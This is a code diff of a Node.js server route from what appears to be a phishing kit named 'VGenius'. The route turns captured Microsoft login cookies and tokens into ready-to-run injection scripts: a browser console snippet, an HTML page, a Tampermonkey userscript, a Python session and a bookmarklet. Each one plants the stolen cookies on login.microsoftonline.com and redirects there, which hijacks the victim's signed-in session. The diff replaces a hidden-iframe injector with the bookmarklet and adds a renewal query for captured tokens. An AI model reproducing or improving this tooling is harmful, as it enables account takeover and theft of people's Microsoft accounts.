@@ -128,7 +128,6 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     }
 
     var cookiesList = [];
-
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
@@ -149,7 +148,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     scripts.html = generateStandaloneHtml(cookiesList);
     scripts.tampermonkey = generateTampermonkeyScript(cookiesList);
     scripts.python = generatePythonScript(cookiesList);
-    scripts.injector = generateInjectorScript(cookiesList);
+    scripts.injector = generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, token.tenant || config.AZURE_TENANT || 'common');
 
     res.json({
       script: scripts.console,
@@ -167,14 +166,12 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
 // ─── Parse cookie string into array of cookie objects ───────────────
 function parseCookies(cookieString) {
   if (!cookieString) return [];
-
   var seenNames = {};
   var pairs = cookieString.split(';').filter(function(c) { return c.trim(); });
 
   for (var i = 0; i < pairs.length; i++) {
     var pair = pairs[i].trim();
     var eqIndex = pair.indexOf('=');
-
     if (eqIndex > 0) {
       var name = pair.substring(0, eqIndex).trim();
       var value = pair.substring(eqIndex + 1).trim();
@@ -183,7 +180,7 @@ function parseCookies(cookieString) {
       // Skip cookie attributes and their values
       if (nameLower === 'expires' || nameLower === 'max-age' || nameLower === 'domain' ||
           nameLower === 'path' || nameLower === 'secure' || nameLower === 'httponly' ||
-          nameLower === 'samesite' || nameLower.startsWith('samesite=')) {
+          nameLower.startsWith('samesite=')) {
         continue;
       }
 
@@ -191,11 +188,7 @@ function parseCookies(cookieString) {
       if (!value || value.length === 0) continue;
 
       // Store unique cookies by lowercase name (last occurrence wins)
-      seenNames[nameLower] = {
-        name: name,
-        value: value,
-        domain: '.login.microsoftonline.com'
-      };
+      seenNames[nameLower] = { name: name, value: value, domain: '.login.microsoftonline.com' };
     }
   }
 
@@ -206,7 +199,6 @@ function parseCookies(cookieString) {
       cookies.push(seenNames[key]);
     }
   }
-
   return cookies;
 }
 
@@ -218,59 +210,59 @@ function generatePopupScript(cookies) {
   var cookieJson = JSON.stringify(cookies);
 
   var script = '(function(){\n';
-  script += '  var cookies = ' + cookieJson + ';\n';
-  script += '  var expStr = "' + expStr + '";\n';
+  script += ' var cookies = ' + cookieJson + ';\n';
+  script += ' var expStr = "' + expStr + '";\n';
   script += '\n';
-  script += '  // Open popup FIRST\n';
-  script += '  var popup = window.open(\n';
-  script += '    "https://login.microsoftonline.com/common/oauth2/authorize",\n';
-  script += '    "vgenius_inject",\n';
-  script += '    "width=800,height=600,scrollbars=yes"\n';
-  script += '  );\n';
+  script += ' // Open popup FIRST\n';
+  script += ' var popup = window.open(\n';
+  script += ' "https://login.microsoftonline.com/common/oauth2/authorize",\n';
+  script += ' "vgenius_inject",\n';
+  script += ' "width=800,height=600,scrollbars=yes"\n';
+  script += ' );\n';
   script += '\n';
-  script += '  if (!popup) {\n';
-  script += '    alert("Popup blocked! Please allow popups for this site.");\n';
-  script += '    return;\n';
-  script += '  }\n';
+  script += ' if (!popup) {\n';
+  script += ' alert("Popup blocked! Please allow popups for this site.");\n';
+  script += ' return;\n';
+  script += ' }\n';
   script += '\n';
-  script += '  // Wait for popup to fully load (2 seconds)\n';
-  script += '  setTimeout(function() {\n';
-  script += '    try {\n';
-  script += '      // Get the popup\'s document context\n';
-  script += '      var popupDoc = popup.document;\n';
+  script += ' // Wait for popup to fully load (2 seconds)\n';
+  script += ' setTimeout(function() {\n';
+  script += ' try {\n';
+  script += ' // Get the popup\'s document context\n';
+  script += ' var popupDoc = popup.document;\n';
   script += '\n';
-  script += '      // Set each cookie directly on the popup document\n';
-  script += '      for (var i = 0; i < cookies.length; i++) {\n';
-  script += '        var c = cookies[i];\n';
-  script += '        var domain = c.domain || ".login.microsoftonline.com";\n';
-  script += '        var cookieVal = encodeURIComponent(c.value);\n';
-  script += '        var setCookie = c.name + "=" + cookieVal;\n';
-  script += '        setCookie += "; domain=" + domain;\n';
-  script += '        setCookie += "; path=/";\n';
-  script += '        setCookie += "; SameSite=None";\n';
-  script += '        setCookie += "; Secure";\n';
-  script += '        setCookie += "; expires=" + expStr;\n';
+  script += ' // Set each cookie directly on the popup document\n';
+  script += ' for (var i = 0; i < cookies.length; i++) {\n';
+  script += ' var c = cookies[i];\n';
+  script += ' var domain = c.domain || ".login.microsoftonline.com";\n';
+  script += ' var cookieVal = encodeURIComponent(c.value);\n';
+  script += ' var setCookie = c.name + "=" + cookieVal;\n';
+  script += ' setCookie += "; domain=" + domain;\n';
+  script += ' setCookie += "; path=/";\n';
+  script += ' setCookie += "; SameSite=None";\n';
+  script += ' setCookie += "; Secure";\n';
+  script += ' setCookie += "; expires=" + expStr;\n';
   script += '\n';
-  script += '        popupDoc.cookie = setCookie;\n';
-  script += '      }\n';
+  script += ' popupDoc.cookie = setCookie;\n';
+  script += ' }\n';
   script += '\n';
-  script += '      // Verify cookies were set\n';
-  script += '      var allCookies = popupDoc.cookie;\n';
-  script += '      console.log("[VGenius] Cookies in popup: " + allCookies.length + " chars");\n';
+  script += ' // Verify cookies were set\n';
+  script += ' var allCookies = popupDoc.cookie;\n';
+  script += ' console.log("[VGenius] Cookies in popup: " + allCookies.length + " chars");\n';
   script += '\n';
-  script += '      // Now redirect to trigger authentication\n';
-  script += '      popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += ' // Now redirect to trigger authentication\n';
+  script += ' popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
   script += '\n';
-  script += '      // Close popup after redirect is initiated\n';
-  script += '      setTimeout(function() {\n';
-  script += '        if (popup && !popup.closed) popup.close();\n';
-  script += '      }, 3000);\n';
+  script += ' // Close popup after redirect is initiated\n';
+  script += ' setTimeout(function() {\n';
+  script += ' if (popup && !popup.closed) popup.close();\n';
+  script += ' }, 3000);\n';
   script += '\n';
-  script += '    } catch(e) {\n';
-  script += '      alert("Error injecting cookies: " + e.message);\n';
-  script += '      if (popup && !popup.closed) popup.close();\n';
-  script += '    }\n';
-  script += '  }, 2000);\n';
+  script += ' } catch(e) {\n';
+  script += ' alert("Error injecting cookies: " + e.message);\n';
+  script += ' if (popup && !popup.closed) popup.close();\n';
+  script += ' }\n';
+  script += ' }, 2000);\n';
   script += '})();';
 
   return script;
@@ -284,90 +276,90 @@ function generateStandaloneHtml(cookies) {
   var expStr = expires.toUTCString();
 
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
-  html += '  <meta charset="UTF-8">\n';
-  html += '  <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
-  html += '  <title>VGenius Cookie Injector</title>\n';
-  html += '  <style>\n';
-  html += '    body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
-  html += '    button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
-  html += '    button:hover { background: #00cca3; }\n';
-  html += '    pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
-  html += '    .status { margin-top: 10px; padding: 10px; border-radius: 4px; }\n';
-  html += '    .success { background: #0a3d0a; color: #0f0; }\n';
-  html += '    .error { background: #3d0a0a; color: #f00; }\n';
-  html += '  </style>\n';
+  html += ' <meta charset="UTF-8">\n';
+  html += ' <meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
+  html += ' <title>VGenius Cookie Injector</title>\n';
+  html += ' <style>\n';
+  html += ' body { font-family: Arial, sans-serif; padding: 20px; max-width: 800px; margin: 0 auto; background: #1a1a1a; color: #00ffcc; }\n';
+  html += ' button { margin: 10px 5px; padding: 12px 24px; cursor: pointer; background: #00ffcc; color: #000; border: none; border-radius: 6px; font-weight: bold; }\n';
+  html += ' button:hover { background: #00cca3; }\n';
+  html += ' pre { background: #0d0d0d; padding: 15px; border: 1px solid #00ffcc; border-radius: 8px; overflow-x: auto; font-size: 11px; }\n';
+  html += ' .status { margin-top: 10px; padding: 10px; border-radius: 4px; }\n';
+  html += ' .success { background: #0a3d0a; color: #0f0; }\n';
+  html += ' .error { background: #3d0a0a; color: #f00; }\n';
+  html += ' </style>\n';
   html += '</head>\n<body>\n';
-  html += '  <h1>VGenius Cookie Session Injector</h1>\n';
-  html += '  <p><strong>Step 1:</strong> Click the button below to open Microsoft login popup</p>\n';
-  html += '  <p><strong>Step 2:</strong> Allow popups when prompted</p>\n';
-  html += '  <p><strong>Step 3:</strong> Cookies are injected automatically after 2 seconds</p>\n';
-  html += '  <button onclick="injectCookies()">Inject Cookies & Auto-Login</button>\n';
-  html += '  <div id="status"></div>\n';
-  html += '  <script>\n';
+  html += ' <h1>VGenius Cookie Session Injector</h1>\n';
+  html += ' <p><strong>Step 1:</strong> Click the button below to open Microsoft login popup</p>\n';
+  html += ' <p><strong>Step 2:</strong> Allow popups when prompted</p>\n';
+  html += ' <p><strong>Step 3:</strong> Cookies are injected automatically after 2 seconds</p>\n';
+  html += ' <button onclick="injectCookies()">Inject Cookies & Auto-Login</button>\n';
+  html += ' <div id="status"></div>\n';
+  html += ' <script>\n';
 
   // Build the actual injection function inline
-  html += '    var cookies = ' + cookieJson + ';\n';
-  html += '    var expStr = "' + expStr + '";\n';
-  html += '    var statusDiv = document.getElementById("status");\n';
+  html += ' var cookies = ' + cookieJson + ';\n';
+  html += ' var expStr = "' + expStr + '";\n';
+  html += ' var statusDiv = document.getElementById("status");\n';
   html += '\n';
-  html += '    function setStatus(msg, type) {\n';
-  html += '      statusDiv.className = "status " + type;\n';
-  html += '      statusDiv.innerHTML = msg;\n';
-  html += '    }\n';
+  html += ' function setStatus(msg, type) {\n';
+  html += ' statusDiv.className = "status " + type;\n';
+  html += ' statusDiv.innerHTML = msg;\n';
+  html += ' }\n';
   html += '\n';
-  html += '    function injectCookies() {\n';
-  html += '      setStatus("Opening popup...", "success");\n';
+  html += ' function injectCookies() {\n';
+  html += ' setStatus("Opening popup...", "success");\n';
   html += '\n';
-  html += '      var popup = window.open(\n';
-  html += '        "https://login.microsoftonline.com/common/oauth2/authorize",\n';
-  html += '        "vgenius_inject",\n';
-  html += '        "width=800,height=600,scrollbars=yes"\n';
-  html += '      );\n';
+  html += ' var popup = window.open(\n';
+  html += ' "https://login.microsoftonline.com/common/oauth2/authorize",\n';
+  html += ' "vgenius_inject",\n';
+  html += ' "width=800,height=600,scrollbars=yes"\n';
+  html += ' );\n';
   html += '\n';
-  html += '      if (!popup) {\n';
-  html += '        setStatus("Popup blocked! Please allow popups for this site.", "error");\n';
-  html += '        return;\n';
-  html += '      }\n';
+  html += ' if (!popup) {\n';
+  html += ' setStatus("Popup blocked! Please allow popups for this site.", "error");\n';
+  html += ' return;\n';
+  html += ' }\n';
   html += '\n';
-  html += '      // Wait 2 seconds for popup to load, then inject\n';
-  html += '      setTimeout(function() {\n';
-  html += '        try {\n';
-  html += '          var popupDoc = popup.document;\n';
+  html += ' // Wait 2 seconds for popup to load, then inject\n';
+  html += ' setTimeout(function() {\n';
+  html += ' try {\n';
+  html += ' var popupDoc = popup.document;\n';
   html += '\n';
-  html += '          // Set each cookie directly on the popup document\n';
-  html += '          for (var i = 0; i < cookies.length; i++) {\n';
-  html += '            var c = cookies[i];\n';
-  html += '            var domain = c.domain || ".login.microsoftonline.com";\n';
-  html += '            var cookieVal = encodeURIComponent(c.value);\n';
-  html += '            var setCookie = c.name + "=" + cookieVal;\n';
-  html += '            setCookie += "; domain=" + domain;\n';
-  html += '            setCookie += "; path=/";\n';
-  html += '            setCookie += "; SameSite=None";\n';
-  html += '            setCookie += "; Secure";\n';
-  html += '            setCookie += "; expires=" + expStr;\n';
+  html += ' // Set each cookie directly on the popup document\n';
+  html += ' for (var i = 0; i < cookies.length; i++) {\n';
+  html += ' var c = cookies[i];\n';
+  html += ' var domain = c.domain || ".login.microsoftonline.com";\n';
+  html += ' var cookieVal = encodeURIComponent(c.value);\n';
+  html += ' var setCookie = c.name + "=" + cookieVal;\n';
+  html += ' setCookie += "; domain=" + domain;\n';
+  html += ' setCookie += "; path=/";\n';
+  html += ' setCookie += "; SameSite=None";\n';
+  html += ' setCookie += "; Secure";\n';
+  html += ' setCookie += "; expires=" + expStr;\n';
   html += '\n';
-  html += '            popupDoc.cookie = setCookie;\n';
-  html += '          }\n';
+  html += ' popupDoc.cookie = setCookie;\n';
+  html += ' }\n';
   html += '\n';
-  html += '          // Verify cookies were set\n';
-  html += '          var allCookies = popupDoc.cookie;\n';
-  html += '          setStatus("Injected ' + cookies.length + ' cookies! Redirecting to Microsoft login...", "success");\n';
+  html += ' // Verify cookies were set\n';
+  html += ' var allCookies = popupDoc.cookie;\n';
+  html += ' setStatus("Injected ' + cookies.length + ' cookies! Redirecting to Microsoft login...", "success");\n';
   html += '\n';
-  html += '          // Now redirect to trigger authentication\n';
-  html += '          popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  html += ' // Now redirect to trigger authentication\n';
+  html += ' popup.location.href = "https://login.microsoftonline.com/?auth=2";\n';
   html += '\n';
-  html += '          // Close popup after redirect is initiated\n';
-  html += '          setTimeout(function() {\n';
-  html += '            if (popup && !popup.closed) popup.close();\n';
-  html += '          }, 3000);\n';
+  html += ' // Close popup after redirect is initiated\n';
+  html += ' setTimeout(function() {\n';
+  html += ' if (popup && !popup.closed) popup.close();\n';
+  html += ' }, 3000);\n';
   html += '\n';
-  html += '        } catch(e) {\n';
-  html += '          setStatus("Error: " + e.message, "error");\n';
-  html += '          if (popup && !popup.closed) popup.close();\n';
-  html += '        }\n';
-  html += '      }, 2000);\n';
-  html += '    }\n';
-  html += '  </script>\n';
+  html += ' } catch(e) {\n';
+  html += ' setStatus("Error: " + e.message, "error");\n';
+  html += ' if (popup && !popup.closed) popup.close();\n';
+  html += ' }\n';
+  html += ' }, 2000);\n';
+  html += ' }\n';
+  html += ' </script>\n';
   html += '</body>\n</html>';
 
   return html;
@@ -381,36 +373,36 @@ function generateTampermonkeyScript(cookies) {
   var expStr = expires.toUTCString();
 
   var script = '// ==UserScript==\n';
-  script += '// @name     VGenius Cookie Injector\n';
-  script += '// @namespace  http://tampermonkey.net/\n';
-  script += '// @version    2.0\n';
+  script += '// @name VGenius Cookie Injector\n';
+  script += '// @namespace http://tampermonkey.net/\n';
+  script += '// @version 2.0\n';
   script += '// @description Inject Microsoft cookies for session bypass\n';
-  script += '// @author     VGenius\n';
-  script += '// @match      https://login.microsoftonline.com/*\n';
-  script += '// @grant      none\n';
+  script += '// @author VGenius\n';
+  script += '// @match https://login.microsoftonline.com/*\n';
+  script += '// @grant none\n';
   script += '// ==/UserScript==\n\n';
   script += '(function() {\n';
-  script += '  \'use strict\';\n\n';
-  script += '  var cookies = ' + cookieJson + ';\n';
-  script += '  var exp = new Date();\n';
-  script += '  exp.setFullYear(exp.getFullYear() + 100);\n';
-  script += '  var expStr = exp.toUTCString();\n\n';
-  script += '  for (var i = 0; i < cookies.length; i++) {\n';
-  script += '    try {\n';
-  script += '      var c = cookies[i];\n';
-  script += '      var d = c.domain || ".login.microsoftonline.com";\n';
-  script += '      document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  script += '        + "; domain=" + d\n';
-  script += '        + "; expires=" + expStr\n';
-  script += '        + "; path=/; SameSite=None; Secure";\n';
-  script += '    } catch(e) {}\n';
-  script += '  }\n\n';
-  script += '  console.log("VGenius: Injected " + cookies.length + " cookies");\n';
-  script += '  alert("Injected " + cookies.length + " cookies. Click OK to continue.");\n';
+  script += ' \'use strict\';\n\n';
+  script += ' var cookies = ' + cookieJson + ';\n';
+  script += ' var exp = new Date();\n';
+  script += ' exp.setFullYear(exp.getFullYear() + 100);\n';
+  script += ' var expStr = exp.toUTCString();\n\n';
+  script += ' for (var i = 0; i < cookies.length; i++) {\n';
+  script += ' try {\n';
+  script += ' var c = cookies[i];\n';
+  script += ' var d = c.domain || ".login.microsoftonline.com";\n';
+  script += ' document.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
+  script += ' + "; domain=" + d\n';
+  script += ' + "; expires=" + expStr\n';
+  script += ' + "; path=/; SameSite=None; Secure";\n';
+  script += ' } catch(e) {}\n';
+  script += ' }\n\n';
+  script += ' console.log("VGenius: Injected " + cookies.length + " cookies");\n';
+  script += ' alert("Injected ' + cookies.length + ' cookies. Click OK to continue.");\n';
   script += '\n';
-  script += '  setTimeout(function() {\n';
-  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += '  }, 1000);\n';
+  script += ' setTimeout(function() {\n';
+  script += ' window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  script += ' }, 1000);\n';
   script += '})();\n';
 
   return script;
@@ -426,17 +418,17 @@ function generatePythonScript(cookies) {
   script += 'session = requests.Session()\n\n';
   script += 'print("Injecting cookies...")\n';
   script += 'for cookie in cookies:\n';
-  script += '    try:\n';
-  script += '        session.cookies.set(\n';
-  script += '            name=cookie["name"],\n';
-  script += '            value=cookie["value"],\n';
-  script += '            domain=cookie["domain"],\n';
-  script += '            secure=True,\n';
-  script += '            samesite="None"\n';
-  script += '        )\n';
-  script += '        print(f"Injected: {cookie[\'name\']}")\n';
-  script += '    except Exception as e:\n';
-  script += '        print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
+  script += ' try:\n';
+  script += ' session.cookies.set(\n';
+  script += ' name=cookie["name"],\n';
+  script += ' value=cookie["value"],\n';
+  script += ' domain=cookie["domain"],\n';
+  script += ' secure=True,\n';
+  script += ' samesite="None"\n';
+  script += ' )\n';
+  script += ' print(f"Injected: {cookie[\'name\']}")\n';
+  script += ' except Exception as e:\n';
+  script += ' print(f"Failed: {cookie[\'name\']} - {e}")\n\n';
   script += 'print("\\nSession ready!")\n';
   script += 'print(f"Total cookies: {len(cookies)}")\n';
   script += 'print(f"Generated at: {datetime.now()}")\n';
@@ -444,47 +436,31 @@ function generatePythonScript(cookies) {
   return script;
 }
 
-// ─── Full iframe-based injector page ────────────────────────────────
-function generateInjectorScript(cookies) {
+// ─── Bookmarklet-based injector (competitor's proven document.cookie method) ──
+function generateInjectorScript(cookies, clientId, tenant) {
   var cookieJson = JSON.stringify(cookies);
-  var expires = new Date();
-  expires.setFullYear(expires.getFullYear() + 100);
-  var expStr = expires.toUTCString();
 
-  var script = '<!DOCTYPE html>\n<html><head><title>VGenius Injector</title></head><body>\n';
-  script += '<h1>Injecting Cookies...</h1>\n';
-  script += '<div id="status">Opening Microsoft login domain...</div>\n';
+  // Build bookmarklet code using document.cookie method
+  var bookmarklet = 'javascript:(function(){';
+  bookmarklet += 'var cookies=' + cookieJson + ';';
+  bookmarklet += 'cookies.forEach(function(c){';
+  bookmarklet += 'var domain=c.domain||".login.microsoftonline.com";';
+  bookmarklet += 'document.cookie=c.name+"="+c.value+"; domain="+domain+"; path=/; Secure; SameSite=None";';
+  bookmarklet += '});';
+  bookmarklet += 'setTimeout(function(){';
+  bookmarklet += 'window.location.href="https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?client_id=' + clientId + '&redirect_uri=https://www.office.com/&response_type=code&scope=openid%20profile%20email";';
+  bookmarklet += '},2000);';
+  bookmarklet += '})()';
+
+  var script = '<!DOCTYPE html>\n<html><head><title>VGenius Cookie Injector</title></head><body>\n';
+  script += '<h1 style="color:#00ccff">Cookie Injection Ready</h1>\n';
+  script += '<p>Drag the button below to your bookmarks bar, then click it on the Microsoft login page.</p>\n';
+  script += '<div id="bookmarklet"></div>\n';
+  script += '<div id="status">Instructions will appear here.</div>\n';
   script += '<script>\n';
-  script += 'var cookies = ' + cookieJson + ';\n';
-  script += 'var expStr = "' + expStr + '";\n';
-  script += 'var statusDiv = document.getElementById("status");\n';
-  script += 'var injected = false;\n\n';
-  script += '// Create hidden iframe\n';
-  script += 'var iframe = document.createElement("iframe");\n';
-  script += 'iframe.style.display = "none";\n';
-  script += 'iframe.src = "https://login.microsoftonline.com/common/oauth2/authorize";\n';
-  script += 'document.body.appendChild(iframe);\n\n';
-  script += 'iframe.onload = function() {\n';
-  script += '  try {\n';
-  script += '    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n';
-  script += '    for(var i = 0; i < cookies.length; i++) {\n';
-  script += '      var c = cookies[i];\n';
-  script += '      var d = c.domain || ".login.microsoftonline.com";\n';
-  script += '      iframeDoc.cookie = c.name + "=" + encodeURIComponent(c.value)\n';
-  script += '        + "; domain=" + d + "; expires=" + expStr + "; path=/; SameSite=None; Secure";\n';
-  script += '    }\n';
-  script += '    statusDiv.textContent = "Cookies injected! Redirecting...";\n';
-  script += '    injected = true;\n';
-  script += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
-  script += '  } catch(e) {\n';
-  script += '    statusDiv.textContent = "Error: " + e.message + ". Try the popup method.";\n';
-  script += '  }\n';
-  script += '};\n\n';
-  script += 'setTimeout(function() {\n';
-  script += '  if (!injected) {\n';
-  script += '    statusDiv.textContent = "Iframe blocked. Use the popup method instead.";\n';
-  script += '  }\n';
-  script += '}, 3000);\n';
+  script += 'var bookmarklet = "' + bookmarklet.replace(/"/g, '\\"') + '";\n';
+  script += 'var div = document.getElementById("bookmarklet");\n';
+  script += 'div.innerHTML = \'<a href="\' + bookmarklet + \'" style="display:inline-block;padding:15px 30px;background:#00ccff;color:#000;text-decoration:none;border-radius:6px;font-weight:bold;">Inject Cookies</a>\';\n';
   script += '</script>\n';
   script += '</body></html>';
 
@@ -530,7 +506,8 @@ router.post('/:id/renew', userAuth, async (req, res) => {
             `UPDATE captured_tokens
              SET cookies_encrypted = ?, token_type = 'cookie',
                  expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
-                 last_renewed = NOW(), renewal_count = COALESCE(renewal_count, 0) + 1,
+                 last_renewed = NOW(),
+                 renewal_count = COALESCE(renewal_count, 0) + 1,
                  access_token_encrypted = ?, refresh_token_encrypted = ?
              WHERE id = ?`,
             [
